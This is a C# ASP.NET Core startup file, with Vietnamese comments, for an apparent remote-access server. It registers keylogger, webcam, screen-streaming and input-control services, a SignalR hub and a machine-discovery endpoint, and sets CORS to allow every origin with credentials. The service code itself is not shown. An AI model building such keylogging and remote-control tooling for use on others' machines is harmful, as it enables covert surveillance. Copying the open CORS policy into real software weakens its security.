using server_os.Hubs;
using server_os.Services; // Namespace đúng của dự án
using Microsoft.AspNetCore.ResponseCompression;

var builder = WebApplication.CreateBuilder(args);

// Cấu hình đường dẫn wwwroot (Để hiện giao diện Server Monitor)
builder.Environment.WebRootPath = Path.Combine(Directory.GetCurrentDirectory(), "wwwroot");

// --- PHẦN 1: ĐĂNG KÝ DỊCH VỤ ---
builder.Services.AddControllers();
builder.Services.AddEndpointsApiExplorer();
builder.Services.AddSwaggerGen();
builder.Services.AddHostedService<SystemMonitorService>();

// A. Đăng ký SignalR (WebSocket)
builder.Services.AddSignalR();

// B. Đăng ký các Service xử lý logic
// QUAN TRỌNG: Các service này phải là Singleton
builder.Services.AddSingleton<KeyloggerService>();
builder.Services.AddSingleton<SystemActionService>();
builder.Services.AddSingleton<WebcamService>();

// --- ĐĂNG KÝ MỚI CHO ULTRAVIEW (Sửa lỗi namespace ở đây) ---
builder.Services.AddSingleton<ScreenStreamService>(); // Không cần server.Services. ở trước vì đã using server_os.Services
builder.Services.AddSingleton<InputControlService>();
// ----------------------------------------------------------

// C. Cấu hình CORS (Cho phép Client React kết nối)
builder.Services.AddCors(options =>
{
    options.AddPolicy("AllowReact", policy =>
    {
        policy.SetIsOriginAllowed(origin => true) // Cho phép MỌI nguồn
              .AllowAnyHeader()
              .AllowAnyMethod()
              .AllowCredentials();
    });
});

var app = builder.Build();

// --- PHẦN 2: CHẠY ỨNG DỤNG ---
if (app.Environment.IsDevelopment())
{
    app.UseSwagger();
    app.UseSwaggerUI();
}

app.UseCors("AllowReact"); // Kích hoạt CORS

// D. Cấu hình hiển thị giao diện Server
app.UseDefaultFiles();
app.UseStaticFiles();

app.MapControllers();

// E. Map SignalR Hub
app.MapHub<SystemHub>("/systemHub");

// F. API Discovery
app.MapGet("/api/discovery", () =>
{
    return Results.Ok(new { message = "REMOTE_SERVER_HERE", machine = Environment.MachineName });
});

// Chạy ứng dụng
app.Run();